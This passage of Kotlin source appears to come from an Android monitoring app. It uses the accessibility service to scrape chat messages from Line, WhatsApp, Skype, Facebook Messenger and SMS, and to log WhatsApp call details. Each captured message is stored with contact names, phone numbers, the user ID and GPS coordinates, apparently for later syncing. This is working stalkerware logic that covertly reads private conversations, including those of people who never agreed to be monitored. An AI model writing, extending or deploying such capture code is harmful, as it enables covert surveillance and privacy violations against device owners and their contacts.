                            AppUtils.md5Hash(AccessibilityUtils.imContactName + AccessibilityUtils.imMessageText + AccessibilityUtils.imDate)
                        if (localDatabaseSource.checkLineIfAlreadyExist(messageId)) {
                            val phoneNumber =
                                AppUtils.retrievePhoneNumberFromDisplayName(AccessibilityUtils.imContactName)
                            var conversationId: String
                            if (!TextUtils.isEmpty(phoneNumber)) {
                                conversationId =
                                    AccessibilityUtils.imContactName + "_" + AppUtils.retrievePhoneNumberFromDisplayName(
                                        AccessibilityUtils.imContactName
                                    )
                                conversationId = conversationId.replace(" ", "")
                            } else {
                                conversationId = AccessibilityUtils.imContactName
                            }

                            logVerbose(
                                "${AppConstants.LINE_UNROOTED_TYPE}, messageId = " + messageId
                                        + ", conversationId = " + conversationId
                                        + ", contactName = " + AccessibilityUtils.imContactName
                                        + ", senderName = " + AccessibilityUtils.senderName
                                        + ", message Text = " + AccessibilityUtils.imMessageText
                                        + ", message Type = " + AccessibilityUtils.messageType
                                        + ", timeStamp = " + AccessibilityUtils.imDate
                            )

                            val lineUnrooted = LineUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(AccessibilityUtils.imContactName)
                                .setSenderName(AccessibilityUtils.senderName)
                                .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                .setType(AccessibilityUtils.messageType)
                                .setMessageDatetime(
                                    AppUtils.formatDate(
                                        System.currentTimeMillis()
                                            .toString()
                                    )
                                )
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertLineUnrooted(lineUnrooted)
                        }
                        AccessibilityUtils.imDate = ""
                        AccessibilityUtils.imMessageText = ""
                        AccessibilityUtils.senderName = ""
                    }
                } else if (id == "chat_ui_message_text") {
                    AccessibilityUtils.imMessageText = sourceText
                    if (!TextUtils.isEmpty(AccessibilityUtils.imDate) && !TextUtils.isEmpty(
                            AccessibilityUtils.imContactName
                        )
                    ) {
                        AccessibilityUtils.imDate =
                            AccessibilityUtils.lastDateString + AccessibilityUtils.imDate
                        AccessibilityUtils.messageType =
                            if (AccessibilityUtils.lastTypedText == AccessibilityUtils.imMessageText) "outgoing" else "incoming"
                        val messageId =
                            AppUtils.md5Hash(AccessibilityUtils.imContactName + AccessibilityUtils.imMessageText + AccessibilityUtils.imDate)
                        if (localDatabaseSource.checkLineIfAlreadyExist(messageId)) {
                            val phoneNumber =
                                AppUtils.retrievePhoneNumberFromDisplayName(AccessibilityUtils.imContactName)
                            var conversationId: String
                            if (!TextUtils.isEmpty(phoneNumber)) {
                                conversationId =
                                    AccessibilityUtils.imContactName + "_" + AppUtils.retrievePhoneNumberFromDisplayName(
                                        AccessibilityUtils.imContactName
                                    )
                                conversationId = conversationId.replace(" ", "")
                            } else {
                                conversationId = AccessibilityUtils.imContactName
                            }
                            logVerbose(
                                "${AppConstants.LINE_UNROOTED_TYPE}, messageId = " + messageId
                                        + ", conversationId = " + conversationId
                                        + ", contactName = " + AccessibilityUtils.imContactName
                                        + ", senderName = " + AccessibilityUtils.senderName
                                        + ", message Text = " + AccessibilityUtils.imMessageText
                                        + ", message Type = " + AccessibilityUtils.messageType
                                        + ", timeStamp = " + AccessibilityUtils.imDate
                            )

                            val lineUnrooted = LineUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(AccessibilityUtils.imContactName)
                                .setSenderName(AccessibilityUtils.senderName)
                                .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                .setType(AccessibilityUtils.messageType)
                                .setMessageDatetime(
                                    AppUtils.formatDate(
                                        System.currentTimeMillis()
                                            .toString()
                                    )
                                )
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertLineUnrooted(lineUnrooted)
                        }
                        AccessibilityUtils.imDate = ""
                        AccessibilityUtils.imMessageText = ""
                        AccessibilityUtils.senderName = ""
                    }
                }
            }
            logVerbose("Test, id = $id, text = $sourceText")
        } catch (e: Exception) {
            logException("${AppConstants.WHATS_APP_UNROOTED_TYPE} ${AppUtils.currentMethod} exception = ${e.message}")
        }
    }

    private fun filterInternetMessages(contentDesc: String, type: String): String? {
        var filteredMessage = ""
        logVerbose("${AppConstants.SMS_LOG_TYPE} sender = ${senderName}, content description = $contentDesc")
        if (type == "Sent") {
            if (contentDesc.startsWith("Me ", true)) {
                filteredMessage = contentDesc.replace("Me ", "", true)
            } else if (contentDesc.startsWith("you said", true)) {
                filteredMessage = contentDesc.replace("You said ", "", true)
            }
        } else if (type == "Inbox") {
            if (senderName.isNotEmpty()) {
                filteredMessage = when {
                    contentDesc.startsWith(
                        "$senderName Said",
                        true
                    ) -> {
                        contentDesc.replace(
                            "$senderName Said ",
                            "", true
                        )
                    }

                    contentDesc.startsWith(
                        "$senderName ",
                        true
                    ) -> {
                        contentDesc.replace(
                            "$senderName ",
                            "", true
                        )
                    }

                    else -> {
                        contentDesc
                    }
                }
            } else {
                logVerbose("${AppConstants.SMS_LOG_TYPE} sender is empty = ${senderName}, content description = $contentDesc")
                return null
            }
        }
        filteredMessage = filteredMessage.replace("End-to-end encrypted message", "", true)

        filteredMessage = filteredMessage.trim()
        if (filteredMessage.contains(".,")) {
            filteredMessage = filteredMessage.substringBefore(".,").trim()
        } else {
            val lowerCaseFilteredMessage = filteredMessage.lowercase()
            when {
                lowerCaseFilteredMessage.contains("sent", true) -> filteredMessage =
                    filteredMessage.replace("sent", "", true)

                lowerCaseFilteredMessage.contains("read", true) -> filteredMessage =
                    filteredMessage.replace("read", "", true)

                lowerCaseFilteredMessage.contains("delivered", true) -> filteredMessage =
                    filteredMessage.replace(" delivered", "", true)

                lowerCaseFilteredMessage.contains("failed", true) -> filteredMessage =
                    filteredMessage.replace("failed", "", true)
            }
            filteredMessage = filteredMessage.trim()

            val filteredArray = filteredMessage.split(" ")
            if (filteredArray.isNotEmpty()) {
                dateTime =
                    if (filteredMessage.endsWith("am", true) || filteredMessage.endsWith(
                            "pm",
                            true
                        )
                    ) {
                        if (AccessibilityUtils.validTimeFormat(filteredArray[filteredArray.size - 2] + " " + filteredArray[filteredArray.size - 1])) {
                            filteredArray[filteredArray.size - 2] + " " + filteredArray[filteredArray.size - 1]
                        } else {
                            ""
                        }
                    } else {
                        if (AccessibilityUtils.validTimeFormat(
                                filteredArray[filteredArray.size - 1],
                                twentyFourHour = true
                            )
                        ) {
                            filteredArray[filteredArray.size - 1]
                        } else {
                            ""
                        }
                    }
            }
            filteredMessage = filteredMessage.trim()
            filteredMessage = filteredMessage.replace(dateTime, "").trim()
        }
        return filteredMessage
    }

    private fun printDefaultMessagingAppMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
        contentDescription: String,
        className: String
    ) {
        if (AppConstants.smsLogSync) {
            try {
                if (id == "composer_title" || id == "conversation_title" || id == "text_content") {
                    senderName = sourceText
                } else if (id != "typer_region" && className == "android.widget.LinearLayout") {
                    if (contentDescription.startsWith(
                            "Me ",
                            true
                        ) || contentDescription.startsWith("You Said", true)
                    ) {
                        messageType = "Sent"
                        imMessageText =
                            filterInternetMessages(contentDescription, messageType) ?: ""
                        logVerbose("${AppConstants.SMS_LOG_TYPE} filtered message = $imMessageText")
                    } else if (contentDescription.isNotEmpty()) {
                        messageType = "Inbox"
                        imMessageText = filterInternetMessages(contentDescription, "Inbox") ?: ""
                        logVerbose("${AppConstants.SMS_LOG_TYPE} filtered message = $imMessageText")
                    }
                }

                if (senderName.isNotEmpty() && imMessageText.isNotEmpty()) {
                    var contactName = ""
                    var phoneNumber = ""

                    if (senderName.isValidPhoneNumber()) {
                        contactName = AppUtils.getContactName(senderName, context)
                        phoneNumber = senderName
                    } else {
                        phoneNumber = AppUtils.retrievePhoneNumberFromDisplayName(senderName)
                        contactName = senderName
                    }

                    val messageId = AppUtils.md5Hash(contactName + imMessageText)
                    logVerbose("${AppConstants.SMS_LOG_TYPE} ready insert = $imMessageText , $senderName")

                    if (localDatabaseSource.checkSmsNotAlreadyExists(messageId)) {
                        logVerbose("${AppConstants.SMS_LOG_TYPE} content description = $contentDescription")
                        imMessageText = URLEncoder.encode(imMessageText, "utf-8")
                        var smsSender = ""
                        if (messageType == "Inbox") {
                            smsSender = if (phoneNumber.isNotEmpty()) {
                                phoneNumber
                            } else {
                                senderName
                            }
                        }
                        var smsRecipient = ""
                        if (messageType == "Sent") {
                            smsRecipient = if (phoneNumber.isNotEmpty()) {
                                phoneNumber
                            } else {
                                senderName
                            }
                        }

                        var messageAlreadyExists = false
                        localDatabaseSource.getAllSmsWithMessageBody(imMessageText) { smsLogs ->
                            if (smsLogs.isNotEmpty()) {
                                smsLogs.forEach { smsLog ->
                                    val smsNumber =
                                        if (messageType == "Inbox") smsLog.smsSender else smsLog.smsRecipient
                                    if (PhoneNumberUtils.compare(
                                            smsNumber,
                                            phoneNumber
                                        ) || smsNumber == phoneNumber
                                    ) {
                                        logVerbose("${AppConstants.SMS_LOG_TYPE} message already exists $smsLog")
                                        messageAlreadyExists = true
                                        return@forEach
                                    }
                                }
                            }
                        }

                        if (!messageAlreadyExists) {
                            val smsLog = SmsLog()
                            smsLog.apply {
                                smsId = messageId
                                smsBody = imMessageText
                                smsType = messageType
                                address = phoneNumber
                                smsTime = AppUtils.formatDate(System.currentTimeMillis().toString())
                                this.smsSender = smsSender
                                this.smsRecipient = smsRecipient
                                smsStatus = "1"
                                locationLongitude = AppConstants.locationLongitude ?: ""
                                locationLattitude = AppConstants.locationLatitude ?: ""
                                userId = AppUtils.getUserId()
                                phoneServiceId = AppUtils.getPhoneServiceId()
                                date = AppUtils.getDate(System.currentTimeMillis())
                                status = 0
                            }
                            logVerbose("${AppConstants.SMS_LOG_TYPE} inserted = $smsLog")
                            localDatabaseSource.insertSms(smsLog)
                            SmsUtil.runSmsTextAlertTask(context, smsLog)
                        }
                    }
                    imMessageText = ""
                    AccessibilityUtils.imDate = ""
                }
            } catch (exception: Exception) {
                logVerbose("${AppConstants.SMS_LOG_TYPE} getting default sms exception = ${exception.message}")
            }
        }
    }

    /**
     * This method captures the content of the Skype Messenger, and observer for the chat messages
     * @param context Context
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     * @param className className of the View
     */
    private fun printSkypeMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String?,
        id: String?,
        className: String,
        pkgName: String,
        nodeInfo: AccessibilityNodeInfo?,
        boundsInScreen: Rect?,
        contentDescription: String?
    ) {
        try {
            if (nodeInfo != null && boundsInScreen != null && contentDescription != null && contentDescription.isNotEmpty() && contentDescription.contains(
                    ","
                )
            ) {
                val conversationName = filterConversationName(contentDescription)
                val message = filterSkypeMssg(contentDescription, conversationName)
                val currentDate = AppUtils.getCurrentFormatedDateOnly()
                val time = retrieveTimeFromDescription(contentDescription)
                if (className == "android.widget.Button" && contentDescription.contains(
                        "view profile",
                        true
                    )
                ) {
                    if (contentDescription.contains("participants")) {
                        imContactName = "$conversationName __group"
                    } else {
                        imContactName = conversationName
                    }
                    logVerbose("${AppConstants.SKYPE_UNROOTED_TYPE} imContact =$imContactName")
                } else if (className == "android.view.ViewGroup") {
                    if (imContactName.isNotEmpty() && conversationName.isNotEmpty() && message.isNotEmpty()) {
                        messageType = if (conversationName == imContactName) {
                            "incoming"
                        } else {
                            "outgoing"
                        }
                        imMessageText = message
                        imDate = time
                        if (messageType == "outgoing") senderName =
                            ""
                        val messageId =
                            AppUtils.md5Hash(imContactName + imMessageText + imDate)
                        if (localDatabaseSource.checkIfSkypeMessageNotExistsAlready(messageId)) {
                            val currentTimeInMilliSeconds = System.currentTimeMillis()
                            val lastTime = AppUtils.formatTime(timeStampVal.toString())
                            val currentTime =
                                AppUtils.formatTime(currentTimeInMilliSeconds.toString())
                            when {
                                currentTime > lastTime -> {
                                    timeStampVal = currentTimeInMilliSeconds
                                }

                                currentTime == lastTime -> {
                                    timeStampVal = currentTimeInMilliSeconds + 1000
                                }

                                currentTime < lastTime -> {
                                    timeStampVal += 1
                                }
                            }
                            val conversationId = imContactName
                            val conversationName = if (imContactName.contains("__group")) {
                                imContactName.replace("__group", "").trim()
                            } else {
                                imContactName
                            }
                            val currentDate = AppUtils.getCurrentFormatedDateOnly()
                            val skypeUnrooted = SkypeUnrooted.SkypeUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(conversationName)
                                .setSenderName(senderName + "___skype")
                                .setMessage(AppUtils.convertStringToBase64(imMessageText))
                                .setType(messageType)
                                .setMessageDatetime(
                                    "$currentDate $time"
                                )
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertSkypeUnrooted(skypeUnrooted)
                            logVerbose("${AppConstants.SKYPE_UNROOTED_TYPE}, $skypeUnrooted")
                        }
                        imMessageText = ""
                    }
                }
            }
        } catch (ex: Exception) {
            logVerbose("${AppConstants.SMS_LOG_TYPE} getting default sms exception = ${ex.message}")
        }
    }

    private fun filterConversationName(contentDescription: String): String {
        var conversationName = ""
        val descriptionArray = if (contentDescription.contains(
                "sent at",
                true
            ) || contentDescription.contains("view profile", true)
        ) {
            contentDescription.split(",")
        } else {
            emptyList()
        }
        if (descriptionArray.size >= 2) {
            conversationName = descriptionArray[0]
        }
        return conversationName
    }

    private fun retrieveTimeFromDescription(contentDescription: String): String {
        var time = ""
        try {
            if (contentDescription.contains("sent at", true)) {
                val descriptionArray = contentDescription.split("sent at")
                if (descriptionArray.size >= 2) {
                    time = descriptionArray[1];
                }
            } else if (contentDescription.contains(",, at", true)) {
                val descriptionArray = contentDescription.split(",, at")
                if (descriptionArray.size >= 2) {
                    time = descriptionArray[1];
                }
            } else if (contentDescription.contains(" at", true)) {
                val descriptionArray = contentDescription.split(" at")
                if (descriptionArray.size >= 2) {
                    time = descriptionArray[1];
                }
            }
            if (time.isNotEmpty()) {
                val outputFormat = SimpleDateFormat("HH:mm:ss", Locale.US)
                val inputFormat = SimpleDateFormat("HH:mm a", Locale.US)

                val date: Date = inputFormat.parse(time)
                val outputText: String = outputFormat.format(date)
                time = outputText
            } else {
                time = AppUtils.getCurrentTime()
            }
        } catch (ex: Exception) {
            time = AppUtils.getCurrentTime()
        }
        return time
    }

    private fun filterSkypeMssg(contentDescription: String, conversationName: String): String {
        var message = contentDescription
        if (message.startsWith(conversationName)) {
            message = message.removePrefix(conversationName)
        }
        if (message.contains("sent at")) {
            message = message.split("sent at")[0]
        }
        if (message.trim().endsWith(",") && message.length > 2) {
            message = message.removeRange(message.length - 2, message.length - 1)
        }
        if (message.trim().startsWith(",") && message.length >= 2) {
            message = message.removeRange(0, 1)
        }
        return message
    }

    /**
     * This method captures the content of the WhatsApp Messenger, and observer for the chat messages
     * @param context Context
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     * @param className className of the View
     */
    private fun printAllWhatsAppMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
        className: String,
        pkgName: String
    ) {
        var srcText = sourceText
        try {
            logVerbose("${AppConstants.WHATS_APP_UNROOTED_TYPE} WhatsApp, id = $id, text = $srcText, className = $className")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val isModeEnabled = AccessibilityUtils.isVOIPModeActive(context)
                if (!AccessibilityUtils.isIncomingVoipCaptured && !AccessibilityUtils.isOutgoingVoipCaptured) {
                    if (id != null && id == "call_status") {
                        srcText = srcText.lowercase(Locale.ROOT)
                        if (srcText == "calling" || srcText == "ringing") {
                            AccessibilityUtils.voipDirection = "outgoing"
                        }
                    } else if (id != null && id == "name") {
                        AccessibilityUtils.voipName = srcText
                        AccessibilityUtils.voipNumber = ""
                    } else if (!TextUtils.isEmpty(AccessibilityUtils.voipName) && (srcText.startsWith(
                            "0:"
                        ) || isModeEnabled)
                    ) {
                        AccessibilityUtils.voipStartTime = System.currentTimeMillis()
                        AccessibilityUtils.voipDirection =
                            if (TextUtils.isEmpty(AccessibilityUtils.voipDirection)) "incoming" else "outgoing"
                        AccessibilityUtils.voipMessenger = IMType.WhatsApp.toString()
                        if (AccessibilityUtils.voipDirection == "incoming") {
                            AccessibilityUtils.isIncomingVoipCaptured = true
                        } else {
                            AccessibilityUtils.isOutgoingVoipCaptured = true
                        }
                    }
                }
            }
            if (AppConstants.syncWhatsApp && id != null) {
                if (id == "message_text" && !srcText.contains("You deleted this message") && !srcText.contains(
                        "This message was deleted"
                    )
                ) {
                    imMessageText = srcText
                    logVerbose("${AppConstants.WHATS_APP_UNROOTED_TYPE} text details = " + imMessageText)
                } else if (id == "date") {
                    if (!TextUtils.isEmpty(AccessibilityUtils.imMessageText) && !TextUtils.isEmpty(
                            AccessibilityUtils.imContactName
                        )
                    ) {
                        AccessibilityUtils.imDate = srcText
                        val isOutgoing =
                            AccessibilityUtils.imMessageText == AccessibilityUtils.lastTypedText
                        if (TextUtils.isEmpty(AccessibilityUtils.senderName) || isOutgoing) {
                            AccessibilityUtils.messageType =
                                if (isOutgoing) "outgoing" else "incoming"
                        } else {
                            AccessibilityUtils.messageType = "incoming"
                        }
                        if (AccessibilityUtils.messageType == "outgoing") AccessibilityUtils.senderName =
                            ""
                        val messageId =
                            AppUtils.md5Hash(AccessibilityUtils.imContactName + AccessibilityUtils.imMessageText + AccessibilityUtils.imDate)
                        AccessibilityUtils.imDate =
                            AccessibilityUtils.lastDateString + AccessibilityUtils.imDate
                        logVerbose(
                            "${AppConstants.WHATS_APP_UNROOTED_TYPE} " +
                                    "Test, message = " + AccessibilityUtils.imDate + " " + AccessibilityUtils.imMessageText
                        )
                        if (localDatabaseSource.checkIfWhatsAppMessageNotExistsAlready(messageId)) {
                            val currentTimeInMilliSeconds = System.currentTimeMillis()
                            when {
                                currentTimeInMilliSeconds > AccessibilityUtils.timeStampVal -> {
                                    AccessibilityUtils.timeStampVal = currentTimeInMilliSeconds
                                }

                                currentTimeInMilliSeconds == AccessibilityUtils.timeStampVal -> {
                                    AccessibilityUtils.timeStampVal =
                                        currentTimeInMilliSeconds + 100
                                }

                                else -> {
                                    AccessibilityUtils.timeStampVal =
                                        AccessibilityUtils.timeStampVal + 1
                                }
                            }
                            val phoneNumber =
                                AppUtils.retrievePhoneNumberFromDisplayName(AccessibilityUtils.imContactName)
                            var conversationId: String
                            if (!TextUtils.isEmpty(phoneNumber)) {
                                conversationId =
                                    AccessibilityUtils.imContactName + "_" + AppUtils.retrievePhoneNumberFromDisplayName(
                                        AccessibilityUtils.imContactName
                                    )
                                conversationId = conversationId.replace(" ", "")
                            } else {
                                conversationId = AccessibilityUtils.imContactName
                            }
                            val whatsAppUnrooted = WhatsAppUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(AccessibilityUtils.imContactName)
                                .setSenderName(AccessibilityUtils.senderName + "___" + if (pkgName == "com.whatsapp") "whatsApp" else "whatsApp Business")
                                .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                .setType(AccessibilityUtils.messageType)
                                .setMessageDatetime(
                                    AppUtils.formatTime(
                                        System.currentTimeMillis()
                                            .toString()
                                    )
                                )
                                .setIsDeleted(0)
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertWhatsAppUnrooted(whatsAppUnrooted)

                            logVerbose("${AppConstants.WHATS_APP_UNROOTED_TYPE}, Test, store message = " + AccessibilityUtils.imDate + " " + AccessibilityUtils.imMessageText + " " + AccessibilityUtils.imContactName)
                        }
                        AccessibilityUtils.imMessageText = ""
                        AccessibilityUtils.imDate = ""
                    }
                } else if (id == "conversation_contact_name") {
                    AccessibilityUtils.imContactName = srcText
                } else if (id == "conversation_contact_status") {
                    AccessibilityUtils.imContactStatus = srcText
                } else if (id == "name_in_group_tv") {
                    AccessibilityUtils.senderName = srcText
                }
            }
        } catch (e: Exception) {
            logException("${AppConstants.WHATS_APP_UNROOTED_TYPE} ${AppUtils.currentMethod} exception = ${e.message}")
        }
    }

    /**
     * This method takes care of capturing & monitoring facebook messenger screen content, and store the incoming & outgoing Messages
     * @param context Context of the App
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     */
    private fun printFacebookMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
        className: String,
        pkgName: String,
        nodeInfo: AccessibilityNodeInfo?,
        boundsInScreen: Rect?,
        contentDescription: String?
    ) {
        try {
            if (AppConstants.syncFacebook && nodeInfo != null && boundsInScreen != null) {
                if (nodeInfo.parent != null && nodeInfo.parent.className != null && nodeInfo.parent.parent != null && nodeInfo.parent.parent.className != null) {
                    val parentClassName = nodeInfo.parent.className
                    val superParentClassName = nodeInfo.parent.parent.className
                    val superParentId = nodeInfo.parent.parent.viewIdResourceName ?: ""
                    val rect = Rect()
                    nodeInfo.getBoundsInParent(rect)
                    if (parentClassName == "android.widget.Button" && className == "android.view.ViewGroup"
                        && superParentClassName == "android.view.ViewGroup" && superParentId.contains(
                            "name removed"
                        )
                    ) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            if (nodeInfo.drawingOrder != null && nodeInfo.drawingOrder == 2)
                                AccessibilityUtils.imContactName = sourceText
                        } else if (rect.bottom >= 50) {
                            AccessibilityUtils.imContactName = sourceText
                        }
                    } else if (nodeInfo.parent.parent.parent != null && sourceText.isNotEmpty() && AccessibilityUtils.imContactName.isNotEmpty()) {
                        if (nodeInfo.className == "android.view.ViewGroup" && nodeInfo.parent.parent.parent.className == "androidx.recyclerview.widget.RecyclerView") {
                            nodeInfo.getBoundsInScreen(rect)
                            messageType = if (rect.left < 180) {
                                "incoming"
                            } else {
                                "outgoing"
                            }
                            imMessageText = sourceText
                            if (messageType == "outgoing") senderName =
                                ""
                            val messageId =
                                AppUtils.md5Hash(AccessibilityUtils.imContactName + imMessageText)
                            if (localDatabaseSource.checkIfFacebookMessageNotExistsAlready(messageId)) {
                                val currentTimeInMilliSeconds = System.currentTimeMillis()
                                val lastTime =
                                    AppUtils.formatTime(AccessibilityUtils.timeStampVal.toString())
                                val currentTime =
                                    AppUtils.formatTime(currentTimeInMilliSeconds.toString())
                                when {
                                    currentTime > lastTime -> {
                                        AccessibilityUtils.timeStampVal = currentTimeInMilliSeconds
                                    }

                                    currentTime == lastTime -> {
                                        AccessibilityUtils.timeStampVal =
                                            currentTimeInMilliSeconds + 1000
                                    }

                                    currentTime < lastTime -> {
                                        AccessibilityUtils.timeStampVal += 1
                                    }
                                }

                                val facebookUnrooted = FacebookUnrooted.FacebookUnrootedBuilder()
                                    .setUniqueId(messageId)
                                    .setConversationId(AccessibilityUtils.imContactName)
                                    .setConversationName(AccessibilityUtils.imContactName)
                                    .setSenderName(senderName + "___facebook")
                                    .setMessage(AppUtils.convertStringToBase64(imMessageText))
                                    .setType(messageType)
                                    .setMessageDatetime(
                                        AppUtils.formatTime(
                                            AccessibilityUtils.timeStampVal
                                                .toString()
                                        )
                                    )
                                    .setStatus(0)
                                    .create()
                                localDatabaseSource.insertFacebookUnrooted(facebookUnrooted)
                                logVerbose("${AppConstants.FACEBOOK_UNROOTED_TYPE}, $facebookUnrooted")
                            }
                            imMessageText = ""
                            logVerbose("FacebookMssgInfo: Conversation Name = ${AccessibilityUtils.imContactName} Message= $sourceText with type $messageType")
                        }
                    }
                }
            }
        } catch (ex: Exception) {
            logException("${AppConstants.FACEBOOK_UNROOTED_TYPE} ${AppUtils.currentMethod} exception = ${ex.message}")
        }
    }

}